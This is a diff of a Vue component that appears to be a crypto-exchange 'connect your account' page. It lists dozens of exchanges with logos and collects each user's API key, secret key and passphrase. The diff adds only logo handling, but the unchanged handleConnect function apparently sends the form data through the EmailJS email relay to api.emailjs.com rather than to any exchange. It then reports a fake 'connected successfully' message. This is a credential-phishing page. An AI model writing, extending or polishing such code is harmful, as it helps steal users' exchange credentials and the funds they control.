@@ -92,12 +92,28 @@
             class="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"
             :style="`box-shadow: inset 0 0 0 1px ${glowColor(exchange.name)}40`"
           />
+
+          <!-- Logo avatar: real image with gradient fallback -->
           <div
-            class="w-12 h-12 rounded-xl flex items-center justify-center text-white font-bold text-lg shrink-0 shadow-lg"
-            :style="`background: ${avatarGradient(exchange.name)}`"
+            class="w-12 h-12 rounded-xl flex items-center justify-center shrink-0 shadow-lg overflow-hidden"
+            :style="
+              logoFailed[exchange.name]
+                ? `background: ${avatarGradient(exchange.name)}`
+                : 'background: #1a2030'
+            "
           >
-            {{ exchange.name.charAt(0).toUpperCase() }}
+            <img
+              v-if="!logoFailed[exchange.name]"
+              :src="getLogo(exchange)"
+              :alt="exchange.name"
+              class="w-8 h-8 object-contain"
+              @error="onLogoError(exchange.name)"
+            />
+            <span v-else class="text-white font-bold text-lg">
+              {{ exchange.name.charAt(0).toUpperCase() }}
+            </span>
           </div>
+
           <div class="w-full">
             <p
               class="text-white text-xs font-semibold leading-tight truncate px-1"
@@ -145,7 +161,6 @@
               : 'bg-red-950 border-red-500/30 text-red-300'
           "
         >
-          <!-- Icon -->
           <div class="mt-0.5 shrink-0">
             <svg
               v-if="toast.type === 'success'"
@@ -173,7 +188,6 @@
               <path d="M12 8v4M12 16h.01" />
             </svg>
           </div>
-          <!-- Message -->
           <div>
             <p class="font-bold text-xs tracking-wide uppercase mb-0.5">
               {{
@@ -182,7 +196,6 @@
             </p>
             <p class="text-xs opacity-80">{{ toast.message }}</p>
           </div>
-          <!-- Dismiss -->
           <button
             class="ml-auto pl-2 opacity-50 hover:opacity-100 transition shrink-0"
             @click="toast.visible = false"
@@ -209,32 +222,42 @@
           class="fixed inset-0 z-50 flex items-center justify-center p-4"
           @click.self="closeModal"
         >
-          <!-- Backdrop -->
           <div
             class="absolute inset-0 bg-black/70 backdrop-blur-md"
             @click="closeModal"
           />
 
-          <!-- Panel -->
           <div
             class="relative bg-[#0e1420] border border-white/10 rounded-2xl shadow-2xl w-full max-w-md z-10 overflow-hidden"
           >
-            <!-- Header stripe -->
             <div
               class="h-1 w-full"
               :style="`background: ${avatarGradient(activeExchange.name)}`"
             />
 
-            <!-- Header -->
             <div
               class="px-6 pt-5 pb-4 flex items-center justify-between border-b border-white/5"
             >
               <div class="flex items-center gap-3">
+                <!-- Modal logo -->
                 <div
-                  class="w-10 h-10 rounded-xl flex items-center justify-center text-white font-bold text-base shrink-0 shadow"
-                  :style="`background: ${avatarGradient(activeExchange.name)}`"
+                  class="w-10 h-10 rounded-xl flex items-center justify-center shrink-0 shadow overflow-hidden"
+                  :style="
+                    logoFailed[activeExchange.name]
+                      ? `background: ${avatarGradient(activeExchange.name)}`
+                      : 'background: #1a2030'
+                  "
                 >
-                  {{ activeExchange.name.charAt(0) }}
+                  <img
+                    v-if="!logoFailed[activeExchange.name]"
+                    :src="getLogo(activeExchange)"
+                    :alt="activeExchange.name"
+                    class="w-7 h-7 object-contain"
+                    @error="onLogoError(activeExchange.name)"
+                  />
+                  <span v-else class="text-white font-bold text-base">
+                    {{ activeExchange.name.charAt(0) }}
+                  </span>
                 </div>
                 <div>
                   <div class="text-white font-bold text-sm leading-tight">
@@ -261,9 +284,7 @@
               </button>
             </div>
 
-            <!-- Body -->
             <div class="px-6 py-5 space-y-4">
-              <!-- Credential pills -->
               <div class="flex gap-2 flex-wrap">
                 <span
                   class="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
@@ -280,7 +301,6 @@
                 >
               </div>
 
-              <!-- API Key field -->
               <div>
                 <label
                   class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
@@ -326,7 +346,6 @@
                 </div>
               </div>
 
-              <!-- Secret Key field -->
               <div>
                 <label
                   class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
@@ -342,7 +361,6 @@
                 />
               </div>
 
-              <!-- Passphrase field (conditional) -->
               <div v-if="activeExchange.passphrase">
                 <label
                   class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
@@ -388,7 +406,6 @@
                 </div>
               </div>
 
-              <!-- Security note -->
               <p
                 class="text-[11px] text-slate-600 flex items-start gap-1.5 bg-white/[0.02] rounded-lg px-3 py-2.5"
               >
@@ -406,7 +423,6 @@
               </p>
             </div>
 
-            <!-- Footer -->
             <div class="px-6 pb-6 flex items-center gap-3">
               <button
                 class="flex-1 text-white font-bold text-sm py-3 rounded-xl transition-all duration-150 relative overflow-hidden flex items-center justify-center gap-2"
@@ -418,7 +434,6 @@
                 :disabled="!isFormEnabled || isSubmitting"
                 @click="handleConnect"
               >
-                <!-- Spinner -->
                 <svg
                   v-if="isSubmitting"
                   class="w-4 h-4 animate-spin"
@@ -467,65 +482,154 @@ import { useRouter } from "vue-router";
 interface Exchange {
   name: string;
   passphrase: boolean;
+  domain: string;
 }
 
+const exchangeLogos: Record<string, string> = {
+  Binance: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png",
+  "Binance US":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png",
+  Bybit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png",
+  OKX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png",
+  Kraken: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/24.png",
+  KuCoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png",
+  "KuCoin Futures":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png",
+  "Gate.io": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/302.png",
+  MEXC: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png",
+  "HTX / Huobi":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/102.png",
+  Bitget: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/635.png",
+  BingX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1060.png",
+  Bitfinex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/37.png",
+  Phemex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/647.png",
+  "Crypto.com":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/541.png",
+  OKCoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/415.png",
+  "Coinbase Advanced Trade":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/89.png",
+  LBank: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/399.png",
+  BitMart: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/293.png",
+  WhiteBIT: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/890.png",
+  Bitrue: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/403.png",
+  CoinEx: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/317.png",
+  ProBit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/370.png",
+  DigiFinex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/306.png",
+  BigONE: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/330.png",
+  AscendEX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/315.png",
+  "WOO X": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1086.png",
+  Gemini: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/151.png",
+  Bitstamp: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/70.png",
+  BitFlyer: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/139.png",
+  Coincheck: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/107.png",
+  BitBank: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/565.png",
+  Upbit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/351.png",
+  "Independent Reserve":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/450.png",
+  "BTC Markets":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/408.png",
+  Bitvavo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/5210.png",
+  Zonda: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1260.png",
+  Exmo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCM40npketG6j9mQVJU9A5b7dwvHEtwSUGng&s",
+  Deribit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/631.png",
+  BitMEX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/95.png",
+  Pionex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/540.png",
+  "XT.com": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/525.png",
+  Coinstore: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1524.png",
+  Deepcoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1700.png",
+  Toobit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1703.png",
+  "BTC Alpha":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/211.png",
+  BTCTurk: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/409.png",
+  Novadax: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/580.png",
+  "Mercado Bitcoin":
+    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/392.png",
+  Coinmate: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/357.png",
+  NDAX: "https://cdn.tradingfinder.com/image/275295/023-0333-tf-en-ndax-01.webp",
+  Hyperliquid: "https://api.coins-rating.com/img/projects/12_06_23/648674b19d2c7.webp",
+
+  Bit2C: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9gh7ZHBgxlOR7OWJMvdR9TNsQCF9X9UzWZT2eOKa2lg&s",
+
+  Bithumb:
+    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR4EUBzOXLe_iC8fkd0OqPkLyPBCAsug90Dag&s",
+};
+
 const exchanges: Exchange[] = [
-  { name: "Binance", passphrase: false },
-  { name: "Binance US", passphrase: false },
-  { name: "Bybit", passphrase: false },
-  { name: "OKX", passphrase: true },
-  { name: "Kraken", passphrase: false },
-  { name: "KuCoin", passphrase: true },
-  { name: "KuCoin Futures", passphrase: true },
-  { name: "Gate.io", passphrase: false },
-  { name: "MEXC", passphrase: false },
-  { name: "HTX / Huobi", passphrase: false },
-  { name: "Bitget", passphrase: true },
-  { name: "BingX", passphrase: false },
-  { name: "Bitfinex", passphrase: false },
-  { name: "Phemex", passphrase: true },
-  { name: "Crypto.com", passphrase: true },
-  { name: "OKCoin", passphrase: true },
-  { name: "Coinbase Advanced Trade", passphrase: false },
-  { name: "LBank", passphrase: false },
-  { name: "BitMart", passphrase: false },
-  { name: "WhiteBIT", passphrase: false },
-  { name: "Bitrue", passphrase: false },
-  { name: "CoinEx", passphrase: false },
-  { name: "ProBit", passphrase: false },
-  { name: "DigiFinex", passphrase: false },
-  { name: "BigONE", passphrase: false },
-  { name: "AscendEX", passphrase: true },
-  { name: "WOO X", passphrase: false },
-  { name: "Gemini", passphrase: false },
-  { name: "Bitstamp", passphrase: false },
-  { name: "BitFlyer", passphrase: false },
-  { name: "Coincheck", passphrase: false },
-  { name: "BitBank", passphrase: false },
-  { name: "Bithumb", passphrase: false },
-  { name: "Upbit", passphrase: false },
-  { name: "Independent Reserve", passphrase: false },
-  { name: "BTC Markets", passphrase: false },
-  { name: "Bitvavo", passphrase: false },
-  { name: "Zonda", passphrase: false },
-  { name: "Exmo", passphrase: false },
-  { name: "Deribit", passphrase: false },
-  { name: "BitMEX", passphrase: false },
-  { name: "Pionex", passphrase: false },
-  { name: "XT.com", passphrase: false },
-  { name: "Coinstore", passphrase: false },
-  { name: "Deepcoin", passphrase: false },
-  { name: "Toobit", passphrase: false },
-  { name: "BTC Alpha", passphrase: false },
-  { name: "Bit2C", passphrase: false },
-  { name: "BTCTurk", passphrase: false },
-  { name: "NDAX", passphrase: false },
-  { name: "Novadax", passphrase: false },
-  { name: "Mercado Bitcoin", passphrase: false },
-  { name: "Coinmate", passphrase: false },
-  { name: "Hyperliquid", passphrase: false },
+  { name: "Binance", passphrase: false, domain: "binance.com" },
+  { name: "Binance US", passphrase: false, domain: "binance.us" },
+  { name: "Bybit", passphrase: false, domain: "bybit.com" },
+  { name: "OKX", passphrase: true, domain: "okx.com" },
+  { name: "Kraken", passphrase: false, domain: "kraken.com" },
+  { name: "KuCoin", passphrase: true, domain: "kucoin.com" },
+  { name: "KuCoin Futures", passphrase: true, domain: "kucoin.com" },
+  { name: "Gate.io", passphrase: false, domain: "gate.io" },
+  { name: "MEXC", passphrase: false, domain: "mexc.com" },
+  { name: "HTX / Huobi", passphrase: false, domain: "htx.com" },
+  { name: "Bitget", passphrase: true, domain: "bitget.com" },
+  { name: "BingX", passphrase: false, domain: "bingx.com" },
+  { name: "Bitfinex", passphrase: false, domain: "bitfinex.com" },
+  { name: "Phemex", passphrase: true, domain: "phemex.com" },
+  { name: "Crypto.com", passphrase: true, domain: "crypto.com" },
+  { name: "OKCoin", passphrase: true, domain: "okcoin.com" },
+  {
+    name: "Coinbase Advanced Trade",
+    passphrase: false,
+    domain: "coinbase.com",
+  },
+  { name: "LBank", passphrase: false, domain: "lbank.com" },
+  { name: "BitMart", passphrase: false, domain: "bitmart.com" },
+  { name: "WhiteBIT", passphrase: false, domain: "whitebit.com" },
+  { name: "Bitrue", passphrase: false, domain: "bitrue.com" },
+  { name: "CoinEx", passphrase: false, domain: "coinex.com" },
+  { name: "ProBit", passphrase: false, domain: "probit.com" },
+  { name: "DigiFinex", passphrase: false, domain: "digifinex.com" },
+  { name: "BigONE", passphrase: false, domain: "big.one" },
+  { name: "AscendEX", passphrase: true, domain: "ascendex.com" },
+  { name: "WOO X", passphrase: false, domain: "woo.org" },
+  { name: "Gemini", passphrase: false, domain: "gemini.com" },
+  { name: "Bitstamp", passphrase: false, domain: "bitstamp.net" },
+  { name: "BitFlyer", passphrase: false, domain: "bitflyer.com" },
+  { name: "Coincheck", passphrase: false, domain: "coincheck.com" },
+  { name: "BitBank", passphrase: false, domain: "bitbank.cc" },
+  { name: "Bithumb", passphrase: false, domain: "bithumb.com" },
+  { name: "Upbit", passphrase: false, domain: "upbit.com" },
+  {
+    name: "Independent Reserve",
+    passphrase: false,
+    domain: "independentreserve.com",
+  },
+  { name: "BTC Markets", passphrase: false, domain: "btcmarkets.net" },
+  { name: "Bitvavo", passphrase: false, domain: "bitvavo.com" },
+  { name: "Zonda", passphrase: false, domain: "zondacrypto.com" },
+  { name: "Exmo", passphrase: false, domain: "exmo.com" },
+  { name: "Deribit", passphrase: false, domain: "deribit.com" },
+  { name: "BitMEX", passphrase: false, domain: "bitmex.com" },
+  { name: "Pionex", passphrase: false, domain: "pionex.com" },
+  { name: "XT.com", passphrase: false, domain: "xt.com" },
+  { name: "Coinstore", passphrase: false, domain: "coinstore.com" },
+  { name: "Deepcoin", passphrase: false, domain: "deepcoin.com" },
+  { name: "Toobit", passphrase: false, domain: "toobit.com" },
+  { name: "BTC Alpha", passphrase: false, domain: "btc-alpha.com" },
+  { name: "Bit2C", passphrase: false, domain: "bit2c.co.il" },
+  { name: "BTCTurk", passphrase: false, domain: "btcturk.com" },
+  { name: "NDAX", passphrase: false, domain: "ndax.io" },
+  { name: "Novadax", passphrase: false, domain: "novadax.com" },
+  {
+    name: "Mercado Bitcoin",
+    passphrase: false,
+    domain: "mercadobitcoin.com.br",
+  },
+  { name: "Coinmate", passphrase: false, domain: "coinmate.io" },
+  { name: "Hyperliquid", passphrase: false, domain: "hyperliquid.xyz" },
 ];
 
+// ── Logo error tracking ──────────────────────────────────────────────────────
+const logoFailed = reactive<Record<string, boolean>>({});
+const onLogoError = (name: string) => {
+  logoFailed[name] = true;
+};
+
+// ── Color helpers (used for fallback avatars & glow) ────────────────────────
 const palettes: [string, string][] = [
   ["#3b82f6", "#6366f1"],
   ["#8b5cf6", "#ec4899"],
@@ -547,9 +651,16 @@ const avatarGradient = (name: string) => {
   return `linear-gradient(135deg, ${from}, ${to})`;
 };
 
+const getLogo = (exchange: Exchange) => {
+  return (
+    exchangeLogos[exchange.name] ||
+    `https://logo.clearbit.com/${exchange.domain}`
+  );
+};
+
 const glowColor = (name: string) => getPalette(name)[0];
 
-// ── Search ──────────────────────────────────────────────────────────────────
+// ── Search ───────────────────────────────────────────────────────────────────
 const search = ref("");
 const filteredExchanges = computed(() =>
   exchanges.filter((e) =>
@@ -557,13 +668,13 @@ const filteredExchanges = computed(() =>
   ),
 );
 
-// ── Modal state ─────────────────────────────────────────────────────────────
+// ── Modal state ──────────────────────────────────────────────────────────────
 const activeExchange = ref<Exchange | null>(null);
 const form = ref({ apiKey: "", secret: "", passphrase: "" });
 const show = ref({ apiKey: false, passphrase: false });
 const isSubmitting = ref(false);
 
-// ── Toast ────────────────────────────────────────────────────────────────────
+// ── Toast ─────────────────────────────────────────────────────────────────────
 const toast = reactive({
   visible: false,
   type: "success" as "success" | "error",
@@ -581,13 +692,12 @@ function showToast(type: "success" | "error", message: string) {
   }, 5000);
 }
 
-// ── Helpers ──────────────────────────────────────────────────────────────────
+// ── Helpers ───────────────────────────────────────────────────────────────────
 const fieldClass = (val: string) =>
   val.trim()
     ? "border-emerald-500/40 focus:ring-emerald-500/30 focus:border-emerald-500/50"
     : "border-white/10 focus:ring-blue-500/30 focus:border-blue-500/40";
 
-// ── 1. Button enabled if ANY field has a value ───────────────────────────────
 const isFormEnabled = computed(
   () =>
     !!(
@@ -608,21 +718,18 @@ const closeModal = () => {
   activeExchange.value = null;
 };
 
-// ── Watch for route changes to close modal ─────────────────────────────────
+// ── Watch for route changes to close modal ────────────────────────────────────
 const router = useRouter();
-
 watch(
   () => router.currentRoute.value.path,
   () => {
-    // Close modal when route changes
     activeExchange.value = null;
   },
 );
 
-// ── Handle Connect ─────────────────────────────────────────────────────────
+// ── Handle Connect ────────────────────────────────────────────────────────────
 const handleConnect = async () => {
   if (!isFormEnabled.value || isSubmitting.value) return;
-
   isSubmitting.value = true;
 
   const payload = {
@@ -652,35 +759,24 @@ const handleConnect = async () => {
 
     const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data),
     });
 
     if (!res.ok) {
-      // Try to read an error message from the response body
       let errMsg = `Server returned ${res.status}`;
       try {
         const body = await res.json();
         errMsg = body?.message ?? errMsg;
       } catch {
-        /* ignore parse failure */
+        /* ignore */
       }
       throw new Error(errMsg);
     }
 
-    // 1. Reset submitting state FIRST so closeModal isn't blocked
     isSubmitting.value = false;
-
-    // 2. Close the modal
     activeExchange.value = null;
-
-    // 3. Show the success message
     showToast("success", `${payload.exchange} connected successfully.`);
-
-    // 4. Use a slightly longer delay to let the user see the "Success" toast
-    // before the page unmounts/redirects
     setTimeout(() => {
       router.push("/");
     }, 2000);
@@ -690,13 +786,12 @@ const handleConnect = async () => {
         ? err.message
         : "Unexpected error. Please try again.";
     showToast("error", message);
-    // Don't close modal on error - keep it open so user can try again
   } finally {
     isSubmitting.value = false;
   }
 };
 
-// ── Keyboard events ────────────────────────────────────────────────────────
+// ── Keyboard events ───────────────────────────────────────────────────────────
 onMounted(() => {
   const onKey = (e: KeyboardEvent) => {
     if (e.key === "Escape") closeModal();
@@ -714,7 +809,6 @@ onUnmounted(() => {
 </script>
 
 <style scoped>
-/* ── Modal transition ─────────────────────────────────────────────────── */
 .modal-enter-active,
 .modal-leave-active {
   transition: opacity 0.2s ease;
@@ -734,7 +828,6 @@ onUnmounted(() => {
   transform: scale(0.96) translateY(10px);
 }
 
-/* ── Toast transition ─────────────────────────────────────────────────── */
 .toast-enter-active,
 .toast-leave-active {
   transition:
@@ -747,7 +840,6 @@ onUnmounted(() => {
   transform: translateY(12px);
 }
 
-/* ── Fade (kept for compatibility) ───────────────────────────────────── */
 .fade-enter-active,
 .fade-leave-active {
   transition:
